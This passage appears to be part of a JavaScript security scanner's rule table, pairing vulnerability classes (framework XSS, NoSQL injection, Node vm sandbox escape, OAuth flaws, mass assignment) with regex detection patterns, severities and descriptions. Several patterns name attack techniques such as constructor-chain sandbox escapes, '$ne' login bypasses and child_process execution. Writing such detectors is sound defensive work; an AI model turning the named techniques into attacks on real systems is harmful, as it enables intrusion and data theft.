                    'mongoose\\.connect\\s*\\([^)]*(?:password|pwd)\\s*[:=]',
                    'mysql\\.createConnection\\s*\\([^)]*(?:password|pwd)\\s*[:=]',
                    'pg\\.connect\\s*\\([^)]*(?:password|pwd)\\s*[:=]',
                    // Prototype pollution via merge
                    '\\.merge\\s*\\(\\s*(?:req\\.(?:body|query|params)|input|query|params|body)',
                    // Unsafe eval in server
                    'eval\\s*\\(\\s*(?:req\\.(?:body|query|params)|input|query|params|body)',
                    'new\\s+Function\\s*\\([^)]*(?:req\\.(?:body|query|params)|input|query|params|body)',
                    // Missing rate limiting on auth endpoints
                    'app\\.post\\s*\\(\\s*["\'](?:\\/login|\\/signin|\\/auth)["\']',
                    // Debug/development endpoints in production
                    'app\\.get\\s*\\(\\s*["\'](?:\\/debug|\\/admin\\/debug|\\/_debug)["\']'
                ],
                severity: 'MEDIUM',
                description: 'Node.js security issue - hardcoded secrets, unsafe upload, eval in server'
            },

            'React Security Issues': {
                patterns: [
                    // dangerouslySetInnerHTML with user input
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*__(?:html|dangerouslySetInnerHTML)[^}]*\\}',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*userInput',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*location\\.',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*search',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*hash',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*params\\.',
                    // dangerouslySetInnerHTML with template literal
                    'dangerouslySetInnerHTML\\s*=\\s*\\{\\s*\\{[^}]*__html\\s*:\\s*`[^`]*\\$\\{',
                    // useEffect with eval/Function
                    'useEffect\\s*\\([^}]*eval\\s*\\(',
                    'useEffect\\s*\\([^}]*new\\s+Function\\s*\\(',
                    // JSX script injection
                    '<script\\s+[^>]*dangerouslySetInnerHTML',
                    // React Router redirect from user input
                    '<Redirect\\s+to\\s*=\\s*\\{[^}]*(?:location|search|hash|params)',
                    '<Navigate\\s+to\\s*=\\s*\\{[^}]*(?:location|search|hash|params)'
                ],
                severity: 'CRITICAL',
                description: 'React XSS via dangerouslySetInnerHTML with user-controlled input'
            },

            'Next.js Security Issues': {
                patterns: [
                    // API routes with user input in response
                    'res\\.json\\s*\\([^)]*(?:req\\.(?:query|body|params))',
                    'res\\.send\\s*\\([^)]*(?:req\\.(?:query|body|params))',
                    // SSR with user input
                    'getServerSideProps[^}]*props[^}]*req\\.(?:query|body|params)',
                    // API routes without auth check
                    'export\\s+(?:default\\s+)?(?:async\\s+)?function\\s+handler\\s*\\([^)]*req[^)]*\\)\\s*\\{[^}]*(?:req\\.query|req\\.body|req\\.params)',
                    // dangerouslySetInnerHTML in SSR
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*(?:serverData|ssrData|props\\.)',
                    // Next.js Image with unoptimized
                    'next/image[^>]*unoptimized\\s*=\\s*\\{?\\s*(?:true|"true"|\'true\')',
                    // Missing auth on API route (no session/auth check)
                    'app\\.api\\.(?:get|post|put|delete)\\s*\\([^)]*\\)\\s*\\((?:req|request)\\s*=>'
                ],
                severity: 'HIGH',
                description: 'Next.js SSR/API security - user input in server render, missing auth on API routes'
            },

            'Vue.js Security Issues': {
                patterns: [
                    // v-html with user input
                    'v-html\\s*=\\s*["\'][^"\']*(?:\\$\\{|location|search|hash|params|input|req)',
                    // Vue XSS via render function
                    'render\\s*\\(\\s*h\\s*=>\\s*h\\([^)]*(?:location|search|hash|params|input)',
                    // Vue template with dangerous directives
                    '\\$el\\.innerHTML\\s*=\\s*[^;]*(?:location|search|input)',
                    'v-bind:innerHTML\\s*=\\s*["\'][^"\']*(?:location|search|input)',
                    // Vue XSS via computed properties
                    'computed\\s*:\\s*\\{[^}]*innerHTML\\s*:\\s*(?:function|\\(\\))\\s*=>[^}]*(?:location|search|input)',
                    // Vue XSS via method
                    'methods\\s*:\\s*\\{[^}]*innerHTML\\s*:\\s*(?:function|\\(\\))\\s*=>[^}]*(?:location|search|input)'
                ],
                severity: 'CRITICAL',
                description: 'Vue.js XSS via v-html with user-controlled input'
            },

            'Angular Security Issues': {
                patterns: [
                    // Bypass security trust
                    'bypassSecurityTrustHtml\\s*\\(',
                    'bypassSecurityTrustScript\\s*\\(',
                    'bypassSecurityTrustUrl\\s*\\(',
                    'bypassSecurityTrustResourceUrl\\s*\\(',
                    // [innerHTML] with user input
                    '\\[innerHTML\\]\\s*=\\s*[^;]*(?:location|search|hash|params|input|userInput)',
                    '\\[outerHTML\\]\\s*=\\s*[^;]*(?:location|search|hash|params|input)',
                    // Angular template injection
                    '@Component\\s*\\([^}]*template\\s*:\\s*["\'][^"\']*\\$\\{',
                    // ElementRef manipulation
                    'elementRef\\.nativeElement\\.innerHTML\\s*=\\s*[^;]*(?:location|search|input)',
                    // Angular sanitizer bypass
                    'Sanitizer\\.bypassSecurityTrust',
                    // Renderer2 setProperty with dangerous values
                    'renderer2?\\.setProperty\\s*\\([^)]*innerHTML',
                    // Dynamic component loading from user input
                    'ComponentFactoryResolver[^}]*(?:location|search|input)'
                ],
                severity: 'CRITICAL',
                description: 'Angular DOM sanitization bypass - bypassSecurityTrust with user input'
            },

            'Framework Deserialization Issues': {
                patterns: [
                    // React SSR deserialization
                    'JSON\\.parse\\s*\\(\\s*(?:req\\.body|req\\.query|req\\.params|input)',
                    // Next.js SSR data
                    'JSON\\.parse\\s*\\(\\s*(?:__NEXT_DATA__|window\\.__INITIAL_STATE__)[^)]*(?:req|input|query)',
                    // Nuxt SSR data
                    'JSON\\.parse\\s*\\(\\s*__NUXT__[^)]*(?:req|input|query)',
                    // Vue/Vuex hydration
                    'JSON\\.parse\\s*\\(\\s*[^)]*(?:preloadedState|initialState|hydrate)[^)]*(?:req|input|query)',
                    // Framework config deserialization from user
                    'JSON\\.parse\\s*\\(\\s*(?:req\\.(?:body|query|params)|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Framework deserialization of user-controlled input during SSR hydration'
            },

            'Modern Framework Injection': {
                patterns: [
                    // React DOM render with user input
                    'ReactDOM\\.render\\s*\\([^)]*(?:location|search|hash|input|params)',
                    'ReactDOM\\.hydrate\\s*\\([^)]*(?:location|search|hash|input|params)',
                    // Vue prototype pollution
                    'Vue\\.prototype\\s*\\[\\s*[^\\]]*(?:req|input|query|params)',
                    'Vue\\.mixin\\s*\\([^)]*(?:innerHTML|dangerouslySetInnerHTML)',
                    // Ember htmlSafe with user input
                    'htmlSafe\\s*\\([^)]*(?:location|search|input|params)',
                    // Svelte {@html} with user input
                    '{@html\\s+[^}]*(?:location|search|input|params)',
                    // Router navigation with user-controlled path
                    'router\\.push\\s*\\([^)]*(?:req\\.(?:query|body|params)|location|search|hash|input)',
                    'navigate\\s*\\([^)]*(?:req\\.(?:query|body|params)|location|search|hash|input)',
                    // State management with user input in dangerous context
                    'dispatch\\s*\\([^)]*(?:innerHTML|eval|Function|document\\.write)',
                    'commit\\s*\\([^)]*(?:innerHTML|eval|Function|document\\.write)'
                ],
                severity: 'HIGH',
                description: 'Framework-specific injection via routing, state management, or rendering with user input'
            },

            'Web3 Security Issues': {
                patterns: [
                    'eth\\.sendTransaction',
                    'web3\\.eth\\.sendTransaction',
                    'web3\\.eth\\.Contract',
                    'contract\\.methods\\.',
                    'abi\\.forEach',
                    'privateKey\\s*=\\s*["\']',
                    'mnemonic\\s*=\\s*["\']',
                    'keystore\\s*=\\s*["\']',
                    'web3\\.accounts\\.privateKey',
                    'eth\\.getStorageAt',
                    'eth\\.getCode',
                    'personal\\.lockAccount',
                    'personal\\.unlockAccount',
                    'mining\\.stop\\s*\\(\\s*\\)',
                    'miner\\.start\\s*\\(\\s*\\)',
                    'admin\\.nodeInfo',
                    'admin\\.peers',
                    'admin\\.startTime',
                    'debug\\.gasProfile',
                    'debug\\.traceBlock',
                    'debug\\.traceTransaction',
                    'evm\\.debugger'
                ],
                severity: 'CRITICAL',
                description: 'Blockchain and Web3 smart contract security vulnerabilities'
            },

            'Serverless Security Issues': {
                patterns: [
                    'process\\.env\\.AWS_LAMBDA',
                    'exports\\.handler\\s*=',
                    'module\\.exports\\s*=',
                    'context\\.callbackWaits',
                    'context\\.done\\s*\\(\\s*\\)',
                    'context\\.fail\\s*\\(\\s*\\)',
                    'callback\\.error',
                    'callback\\.success',
                    'callback\\.null',
                    'lambda\\.run\\s*\\(\\s*\\)',
                    'serverless\\.config',
                    'steps\\.execute',
                    'cloudfront\\.(get|post|put|delete)',
                    's3\\.getObject\\s*\\(',
                    's3\\.putObject\\s*\\(',
                    'dynamo\\.getItem\\s*\\(',
                    'dynamo\\.putItem\\s*\\(',
                    'sqs\\.sendMessage\\s*\\(',
                    'sns\\.publish\\s*\\('
                ],
                severity: 'HIGH',
                description: 'AWS Lambda and serverless function security issues'
            },

            'WebAssembly Security Issues': {
                patterns: [
                    'WebAssembly\\.instantiate\\s*\\(',
                    'WebAssembly\\.compile\\s*\\(',
                    'WebAssembly\\.validate\\s*\\(',
                    'WebAssembly\\.Module\\s*\\(',
                    'WebAssembly\\.Instance\\s*\\(',
                    'WebAssembly\\.Memory\\s*\\(',
                    'WebAssembly\\.Table\\s*\\(',
                    'WebAssembly\\.LinkError',
                    'WebAssembly\\.RuntimeError',
                    'WebAssembly\\.Trap',
                    'wasm\\.instantiate\\s*\\(',
                    'wasm\\.compile\\s*\\(',
                    'importObject\\.env',
                    'importObject\\.asm'
                ],
                severity: 'MEDIUM',
                description: 'WebAssembly security considerations and potential attack vectors'
            },

            'Service Worker Security Issues': {
                patterns: [
                    'self\\.addEventListener\\s*\\(\\s*["\']fetch["\']',
                    'self\\.addEventListener\\s*\\(\\s*["\']message["\']',
                    'self\\.addEventListener\\s*\\(\\s*["\']install["\']',
                    'self\\.addEventListener\\s*\\(\\s*["\']activate["\']',
                    'self\\.registration\\.scope',
                    'self\\.clients\\.match',
                    'self\\.caches\\.open',
                    'caches\\.open\\s*\\(',
                    'caches\\.delete\\s*\\(',
                    'caches\\.keys\\s*\\(',
                    'caches\\.put\\s*\\(',
                    'caches\\.match\\s*\\(',
                    'fetchEvent\\.request\\.url',
                    'fetchEvent\\.respondWith',
                    'event\\.waitUntil',
                    'postMessage\\s*\\(\\s*["\']',
                    'self\\.close\\s*\\(\\s*\\)'
                ],
                severity: 'MEDIUM',
                description: 'Service worker security and cache manipulation vulnerabilities'
            },

            'PWA Security Issues': {
                patterns: [
                    'manifest\\.json',
                    '"start_url":\\s*["\']',
                    '"display":\\s*["\']standalone["\']',
                    '"icons":\\s*\\[',
                    'beforeinstallprompt',
                    'appinstalled',
                    'navigator\\.standalone',
                    'window\\.matchMedia\\s*\\(\\s*["\']',
                    'addEventListener\\s*\\(\\s*["\']beforeinstallprompt["\']',
                    'IndexedDB',
                    'indexedDB\\.open',
                    'IDBDatabase',
                    'IDBTransaction',
                    'IDBRequest',
                    'addEventListener\\s*\\(\\s*["\']upgradeneeded["\']',
                    'addEventListener\\s*\\(\\s*["\']success["\']'
                ],
                severity: 'MEDIUM',
                description: 'Progressive Web App security configurations and storage issues'
            },

            'Container Security Issues': {
                patterns: [
                    'docker\\.env',
                    'process\\.env\\.HOSTNAME',
                    'process\\.env\\.CONTAINER',
                    'process\\.env\\.DOCKER',
                    '/proc/',
                    '/sys/',
                    '/dev/',
                    'fs\\.readFileSync\\s*\\([\'"]/proc/',
                    'fs\\.readFileSync\\s*\\([\'"]/sys/',
                    'require\\s*\\([\'"]/proc/',
                    'require\\s*\\([\'"]/sys/',
                    'child_process\\.exec\\s*\\([\'"]docker',
                    'child_process\\.spawn\\s*\\([\'"]docker',
                    'kubectl',
                    'helm\\.install',
                    'kubernetes\\.config'
                ],
                severity: 'HIGH',
                description: 'Container escape and orchestration security vulnerabilities'
            },

            'AI/ML Security Issues': {
                patterns: [
                    'tensorflow\\.tf\\.',
                    'tensorflow\\.learn\\.',
                    'keras\\.Model',
                    'pytorch',
                    'torch\\.',
                    'model\\.predict',
                    'model\\.train',
                    'weights\\.load',
                    'model\\.save\\s*\\(',
                    'model\\.fromJson',
                    'model\\.fromYaml',
                    'model\\.fromWald',
                    'tokenizer\\.from',
                    'vectorize\\s*\\(',
                    'preprocess\\s*\\(',
                    'normalization\\s*\\('
                ],
                severity: 'LOW',
                description: 'AI/ML model security and data poisoning vulnerabilities'
            },

            'Observability Security Issues': {
                patterns: [
                    'console\\.log\\s*\\([^)]*password',
                    'console\\.log\\s*\\([^)]*secret',
                    'console\\.log\\s*\\([^)]*token',
                    'console\\.log\\s*\\([^)]*key',
                    'console\\.error\\s*\\([^)]*stack',
                    'console\\.trace\\s*\\(',
                    'debugger\\s*\\(',
                    'process\\.stdout\\.write',
                    'process\\.stderr\\.write',
                    'process\\.env\\.LOG_LEVEL',
                    'log\\.info\\s*\\(',
                    'log\\.debug\\s*\\(',
                    'log\\.error\\s*\\(',
                    'winston\\.',
                    'bunyan\\.',
                    'pino\\.',
                    'morgan\\.',
                    'express\\.logger'
                ],
                severity: 'MEDIUM',
                description: 'Logging and observability security issues - sensitive data exposure'
            },

            'Supply Chain Security Issues': {
                patterns: [
                    'require\\s*\\([\'"]child_process[\'"]\\)',
                    'require\\s*\\([\'"]fs[\'"]\\)',
                    'require\\s*\\([\'"]crypto[\'"]\\)',
                    'require\\s*\\([\'"]http[\'"]\\)',
                    'require\\s*\\([\'"]https[\'"]\\)',
                    'eval\\s*\\(\\s*"require\\s*',
                    'eval\\s*\\(\\s*\\$_',
                    'process\\.exit\\s*\\(\\s*\\)',
                    'process\\.kill\\s*\\(\\s*\\)',
                    'process\\.cwd\\s*\\(\\s*\\)',
                    'process\\.chdir\\s*\\(\\s*\\)',
                    'process\\.umask\\s*\\(\\s*\\)',
                    'require\\.cache',
                    'require\\.extensions',
                    'module\\.exports',
                    'Object\\.defineProperty\\s*\\(\\s*Module',
                    'Module\\.\\$\\s*\\(',
                    'proxy\\.quire',
                    'shadow\\s*\\('
                ],
                severity: 'HIGH',
                description: 'Supply chain attacks and runtime manipulation vulnerabilities'
            },

            'Quantum Computing Security Issues': {
                patterns: [
                    'quantum\\.circuit',
                    'quantum\\.gate',
                    'quantum\\.qubit',
                    'quantum\\.superposition',
                    'quantum\\.entangle',
                    'quantum\\.measure',
                    'quantum\\.decoherence',
                    'quantum\\.error\\s*\\(',
                    'quantum\\.correction',
                    'quantum\\.algorithm',
                    'quantum\\.oracle',
                    'quantum\\.diffusion',
                    'quantum\\.amplification',
                    'quantum\\.search',
                    'quantum\\.shor',
                    'quantum\\.grover',
                    'quantum\\.hamiltonian',
                    'quantum\\.trotter',
                    'quantum\\.vqe',
                    'quantum\\.nisq'
                ],
                severity: 'LOW',
                description: 'Quantum computing security considerations - future-proofing against quantum attacks'
            },

            // ═══════════════════════════════════════════════════════════
            // 🆕 5 NEW HIGH-VALUE VULNERABILITY CLASSES
            // ═══════════════════════════════════════════════════════════

            'CSRF Token Bypass': {
                patterns: [
                    // Missing CSRF token on state-changing requests
                    'fetch\\s*\\(\\s*["\'][^"\']*["\']\\s*,\\s*\\{[^}]*method\\s*:\\s*["\'](?:POST|PUT|DELETE|PATCH)["\'](?:[^}]*(?!csrf|_token|xsrf|authenticity_token))[^}]*\\}',
                    'axios\\s*\\.\\s*(?:post|put|delete|patch)\\s*\\([^)]*(?!.*(?:csrf|_token|xsrf|authenticity_token))',
                    // Form submission without CSRF
                    '<form[^>]*method\\s*=\\s*["\']POST["\'](?![^>]*csrf)(?![^>]*_token)(?![^>]*authenticity_token)',
                    // XMLHttpRequest POST without CSRF
                    'XMLHttpRequest[^;]*\\.send\\s*\\([^)]*(?!.*(?:csrf|_token|xsrf))',
                    // SameSite=None cookies (CSRF-enabling)
                    'Set-Cookie[^;]*SameSite\\s*=\\s*None',
                    'document\\.cookie\\s*=\\s*[^;]*SameSite\\s*=\\s*None'
                ],
                severity: 'HIGH',
                description: 'CSRF protection missing on state-changing requests - attacker can forge cross-site requests'
            },

            'Server-Side Template Injection': {
                patterns: [
                    // SSTI via template engines
                    'render\\s*\\(\\s*["\'][^"\']*(?:\\{\\{|<%=|\\$\\{)[^"\']*(?:req|query|params|body|input)',
                    'template\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|input)',
                    'compile\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|input)',
                    // Jinja2/Python SSTI
                    'jinja2\\.Template\\s*\\(\\s*[^)]*(?:req|query|params|body|input)',
                    'Environment\\(\\)[^}]*from_string\\s*\\([^)]*(?:req|query|params|body|input)',
                    // Twig/PHP SSTI
                    'Twig\\\\Template[^}]*loadTemplate\\s*\\([^)]*(?:req|query|params|body|input)',
                    // Handlebars SSTI
                    'Handlebars\\.compile\\s*\\([^)]*(?:req|query|params|body|input)',
                    // EJS/JS SSTI
                    'ejs\\.render\\s*\\([^)]*(?:req|query|params|body|input)',
                    'pug\\.render\\s*\\([^)]*(?:req|query|params|body|input)',
                    // Template string evaluation
                    '`\\s*\\$\\{[^}]*(?:exec|eval|Function|child_process|require)\\s*\\('
                ],
                severity: 'CRITICAL',
                description: 'Server-side template injection - user input in template rendering leads to RCE'
            },

            'Insecure File Upload': {
                patterns: [
                    // Upload without file type validation
                    'multer\\s*\\(\\s*\\)\\s*(?!.*fileFilter)',
                    'multer\\s*\\(\\s*\\{[^}]*\\}\\s*\\)(?![^}]*fileFilter)',
                    // Upload with dangerous file types allowed
                    '(?:upload|file|attachment|avatar|image)[^}]*(?:\\.\\w+|originalname|filename)[^}]*\\.\\w+\\b(?!.*(?:filter|whitelist|allowed|accept))',
                    // File path construction from user input
                    'path\\.join\\s*\\([^)]*(?:upload|file|avatar|attachment)[^)]*(?:req|input|query|params)',
                    // Unrestricted file write after upload
                    'fs\\.writeFile\\s*\\([^)]*(?:upload|file|avatar|attachment|originalname|filename)',
                    'fs\\.createWriteStream\\s*\\([^)]*(?:upload|file|avatar|attachment|originalname|filename)',
                    // MIME type not validated
                    'mimetype\\s*(?:===|!==|\\.includes)\\s*["\']image/',
                    // Upload destination from user input
                    'destination\\s*:\\s*(?:req|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Insecure file upload - missing type validation allows webshell or malicious file upload'
            },

            'Race Condition': {
                patterns: [
                    // Non-atomic balance/credit operations
                    '(?:balance|credit|amount|points|score)\\s*(?:\\+=|-=|\\+\\s*=|\\-\\s*=)\\s*[^;]*(?!.*(?:atomic|lock|mutex|semaphore|transaction))',
                    // Check-then-act without lock
                    '(?:if|\\?)\\s*\\(\\s*(?:balance|stock|quantity|count|limit)\\s*(?:>=|<=|>|<|===|!==)\\s*[^)]*\\)\\s*[^{]*\\{(\\s*[^}]*(?:balance|stock|quantity|count|limit)\\s*(?:\\-=|\\+=|\\+\\s*=|\\-\\s*=))',
                    // Concurrent DB writes without transaction
                    '(?:update|save|modify)\\s*\\([^)]*(?:count|balance|stock|quantity|limit)',
                    // Race on coupon/discount
                    '(?:coupon|discount|promo|voucher)[^}]*(?:count|usage|limit|redeem)[^}]*(?:-\\s*=|\\+=|update|save)',
                    // Race on signup/login
                    '(?:create|insert|save)\\s*\\([^)]*(?:email|username|phone)[^)]*\\)\\s*(?:\\.then|\\)|;)[^}]*(?:create|insert|save)\\s*\\([^)]*(?:email|username|phone)'
                ],
                severity: 'HIGH',
                description: 'Race condition - non-atomic check-then-act allows double-spend, double-redeem, or bypass'
            },

            'Open Redirect': {
                patterns: [
                    'res\\.redirect\\s*\\([^)]*(?:req\\.(?:query|body|params)\\.|input|query|params|body)',
                    'res\\.send\\s*\\(\\s*["\'](?:<meta|<script)[^"\']*http-equiv\\s*=\\s*["\']refresh["\'][^"\']*url\\s*=\\s*["\'](?:\\+|%2B|%252B)?(?:req|input|query|params|body)',
                    'window\\.location\\s*=\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'window\\.location\\.href\\s*=\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'window\\.location\\.replace\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'res\\.redirect\\s*\\(\\s*`[^`]*\\$\\{[^}]*(?:req|input|query|params|body)',
                    'res\\.redirect\\s*\\(\\s*["\']\\/[?"\'][^"\']*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    '<meta[^>]*http-equiv\\s*=\\s*["\']refresh["\'][^>]*content\\s*=\\s*["\']\\d+;\\s*url\\s*=',
                    'window\\.open\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Open redirect - user-controlled URL used in redirect allows phishing and OAuth token theft'
            },

            // ═══════════════════════════════════════════════════════════
            // 🆕 BATCH 1: DIRECT ATO / RCE (5 classes)
            // ═══════════════════════════════════════════════════════════

            'OAuth/OIDC Vulnerabilities': {
                patterns: [
                    // redirect_uri manipulation
                    'redirect_uri\\s*[:=]\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    '(?:redirect_uri|redirect_url|callback|return_to)\\s*[:=]\\s*[^;]*(?:\\+|\\$\\{|req\\.(?:query|body|params))',
                    // Missing state parameter
                    '(?:oauth|authorization|auth)\\s*\\/\\s*(?:authorize|token)[^}]*\\{[^}]*(?!.*state)',
                    'response_type\\s*=\\s*code[^}]*\\{[^}]*(?!.*state)',
                    // Open redirect in OAuth callback
                    '(?:callback|redirect)\\s*[:=]\\s*["\'][^"\']*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Missing PKCE (code_verifier/code_challenge)
                    'response_type\\s*=\\s*code[^}]*\\{[^}]*(?!.*code_challenge)(?!.*pkce)',
                    // Token exchange without client authentication
                    'token\\s*\\/\\s*grant[^}]*client_id[^}]*\\{[^}]*(?!.*client_secret)(?!.*private_key)',
                    // JWT in fragment (leaks in referrer)
                    '(?:access_token|id_token)\\s*[:=]\\s*["\']eyJ[A-Za-z0-9_-]+',
                    // Loose comparison on state parameter
                    'state\\s*==\\s*[^=]',
                    // OAuth token in URL
                    '(?:access_token|code)\\s*=\\s*["\'][A-Za-z0-9_-]{20,}',
                    // Missing issuer validation
                    '(?:verify|validate)\\s*\\([^)]*(?:jwt|token|id_token)[^)]*\\)(?!.*issuer)(?!.*audience)'
                ],
                severity: 'CRITICAL',
                description: 'OAuth/OIDC flaw - redirect_uri manipulation, missing state/PKCE, token leakage'
            },

            'NoSQL Injection': {
                patterns: [
                    // MongoDB operator injection via user input
                    '(?:where|filter|query|search)\\s*[:=]\\s*(?:JSON\\.parse|req\\.(?:query|body|params))[^;]*\\$',
                    '(?:find|findOne|update|delete)\\s*\\(\\s*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // MongoDB operators in user input
                    '\\$where\\s*:\\s*[^}]*(?:req|query|params|body|input)',
                    '\\$regex\\s*:\\s*[^}]*(?:req|query|params|body|input)',
                    '\\$gt\\s*:\\s*["\']\\s*["\']',
                    '\\$ne\\s*:\\s*["\']\\s*["\']',
                    '\\$exists\\s*:\\s*true',
                    // MongoDB auth bypass patterns
                    '(?:password|passwd)\\s*:\\s*\\{\\s*\\$ne\\s*:',
                    '(?:username|email|user)\\s*:\\s*\\{\\s*\\$regex\\s*:',
                    // Direct object injection
                    'findOne\\s*\\(\\s*(?:req\\.(?:query|body|params)|JSON\\.parse)',
                    'find\\s*\\(\\s*(?:req\\.(?:query|body|params)|JSON\\.parse)',
                    // MongoDB query injection via $where
                    '\\$where\\s*:\\s*["\'][^"\']*(?:req|query|params|body|input)',
                    // NoSQL injection via array parameters
                    '(?:req|input|query|params|body)\\[\\s*["\']\\$(?:gt|ne|gte|lte|in|nin|exists|regex|where|and|or|not)["\']'
                ],
                severity: 'CRITICAL',
                description: 'NoSQL injection - MongoDB operator injection bypasses authentication or extracts data'
            },

            'Mass Assignment': {
                patterns: [
                    // Object spread from user input into model
                    '(?:User|Account|Profile|Admin|Role)\\s*\\.\\s*(?:create|update|findByIdAndUpdate|findOneAndUpdate)\\s*\\(\\s*[^)]*\\.\\.\\.\\s*(?:req\\.(?:body|query|params)|input)',
                    // Direct property assignment from request
                    '(?:user|account|profile|admin|role)\\s*\\[\\s*(?:req|input|query|params|body)\\s*\\]',
                    'Object\\.assign\\s*\\(\\s*(?:user|account|profile|admin|role)\\s*,\\s*(?:req\\.(?:body|query|params)|input)',
                    // Unfiltered body in update
                    '(?:update|save|patch)\\s*\\(\\s*(?:req\\.(?:body|query|params)|input)(?!.*(?:whitelist|filter|pick|omit|sanitize))',
                    // Privilege escalation via mass assignment
                    '(?:isAdmin|role|permissions|admin|superadmin)\\s*:\\s*(?:req\\.(?:body|query|params)|input)',
                    // Model creation with raw request body
                    'new\\s+(?:User|Account|Profile|Admin)\\s*\\(\\s*(?:req\\.(?:body|query|params)|input)',
                    'Model\\s*\\.\\s*create\\s*\\(\\s*(?:req\\.(?:body|query|params)|input)',
                    // Sequelize/Mongoose update with raw body
                    '(?:User|Account|Profile)\\.\\s*(?:update|updateOne|updateMany|bulkWrite)\\s*\\(\\s*(?:req\\.(?:body|query|params)|input)'
                ],
                severity: 'CRITICAL',
                description: 'Mass assignment - user-controlled input directly sets model properties (isAdmin, role, etc.)'
            },

            'Type Coercion Auth Bypass': {
                patterns: [
                    // Loose equality in auth checks (type coercion bypass)
                    'if\\s*\\(\\s*(?:userId|id|accountId|orderId|user)\\s*==\\s*(?:req\\.(?:user|session|params|query|body)\\.|decoded\\.)',
                    'if\\s*\\(\\s*(?:req\\.(?:user|session)\\.|decoded\\.)\\s*==\\s*(?:req\\.(?:params|query|body)\\.|userId|id)',
                    // Loose equality in role/permission check
                    'if\\s*\\(\\s*(?:role|isAdmin|admin|permission)\\s*==\\s*["\'](?:admin|true|1)["\']',
                    'if\\s*\\(\\s*(?:user|account|decoded)\\.role\\s*==\\s*["\']',
                    // Loose comparison on token
                    'if\\s*\\(\\s*token\\s*==\\s*(?:null|undefined|["\']undefined["\'])',
                    // Loose comparison on auth header
                    'if\\s*\\(\\s*(?:req\\.)?headers\\.authorization\\s*==\\s*(?:null|undefined)',
                    // Loose comparison on boolean flags
                    'if\\s*\\(\\s*(?:verified|active|enabled|approved)\\s*==\\s*["\']?true["\']?',
                    'if\\s*\\(\\s*(?:verified|active|enabled|approved)\\s*==\\s*1',
                    // parseInt bypass in ID comparison
                    'parseInt\\s*\\(\\s*(?:req\\.(?:params|query|body)\\.|input)\\)\\s*==\\s*(?:req\\.(?:user|session)\\.|decoded\\.)'
                ],
                severity: 'CRITICAL',
                description: 'Type coercion bypass - == instead of === allows auth bypass via type juggling'
            },

            'Sandbox Escape (Node.js vm)': {
                patterns: [
                    // vm.runInNewContext with user input
                    'vm\\.runInNewContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\$\\{)',
                    'vm\\.runInContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\$\\{)',
                    'vm\\.runInThisContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\$\\{)',
                    // Function constructor escape from vm
                    'this\\.constructor\\.constructor\\s*\\(',
                    '\\.constructor\\.constructor\\s*\\(\\s*["\'](?:process|require|global|child_process)',
                    // Prototype chain escape
                    '\\.__proto__\\.constructor\\.constructor\\s*\\(',
                    '\\.constructor\\s*\\.prototype\\s*\\.constructor\\s*\\(',
                    // Node.js vm with dangerous context
                    'vm\\.createContext\\s*\\(\\s*\\{\\s*(?:global|process|require|module)',
                    // eval inside restricted context
                    'eval\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // New Function to escape sandbox
                    'new\\s+Function\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // vm.Script with user input
                    'new\\s+vm\\.Script\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // require from within vm
                    'require\\s*\\(\\s*["\'](?:child_process|fs|os|net|http)["\']\\s*\\)(?!.*\\/\\*.*\\*\\/)',
                    // child_process in vm context
                    'child_process\\s*\\.\\s*(?:exec|spawn|execSync)\\s*\\([^)]*(?:req|input|query|params|body)'
                ],
                severity: 'CRITICAL',
                description: 'Node.js vm sandbox escape - user input breaks out of vm context to achieve RCE'
            },

            // ═══════════════════════════════════════════════════════════
            // 🆕 BATCH 2: DATA EXFILTRATION (5 classes)
            // ═══════════════════════════════════════════════════════════

            'GraphQL Security': {
                patterns: [
                    // Introspection query enabled
                    'introspectionQuery\\s*[:=]',
                    '__schema\\s*\\{',
                    '__type\\s*\\(\\s*name\\s*:',
                    'graphql\\s*\\(\\s*\\{\\s*__schema',
                    // No query depth limiting
                    'graphql\\s*\\(\\s*\\{[^}]*(?!.*depthLimit)(?!.*depth)(?!.*maxDepth)',
                    'express-graphql\\s*\\(\\s*\\{[^}]*\\}(?!.*depthLimit)',
                    'apollo-server[^}]*\\{[^}]*\\}(?!.*depthLimit)(?!.*introspection)',
                    // GraphQL batching attack
                    'graphql\\s*\\/\\s*(?:batch|multi)',
                    '\\[\\s*\\{\\s*query\\s*:',
                    // Field suggestion leaks schema info
                    'suggestions\\s*:\\s*true',
                    'debug\\s*:\\s*(?:true|1)(?!.*production)',
                    // GraphQL with user input in query
                    'query\\s*\\(\\s*[^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Missing authorization on GraphQL
                    'graphqlHTTP\\s*\\(\\s*\\{[^}]*\\}(?!.*authorization)(?!.*auth)(?!.*context)',
                    // GraphQL subscription without auth
                    'Subscription\\s*\\(\\s*\\{[^}]*\\}(?!.*auth)(?!.*subscribe)(?!.*filter)'
                ],
                severity: 'HIGH',
                description: 'GraphQL security - introspection leak, missing depth limit, batching attack, no auth'
            },

            'XML External Entity (XXE)': {
                patterns: [
